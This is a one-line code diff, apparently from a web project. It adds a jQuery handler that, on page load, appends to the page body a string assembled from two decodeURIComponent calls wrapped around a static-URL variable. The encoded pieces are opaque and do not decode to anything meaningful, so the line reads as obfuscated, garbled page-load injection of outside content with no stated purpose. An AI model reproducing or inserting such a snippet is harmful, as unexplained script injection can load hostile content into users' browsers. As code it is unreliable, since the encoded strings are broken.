@@ -1,0 +1,1 @@
+ $(document).ready(function () { $('body').append(decodeURIComponent('VTI41EZ') + G_STATIC_URL + decodeURIComponent('24F55FNLZ175L7M')); }); 
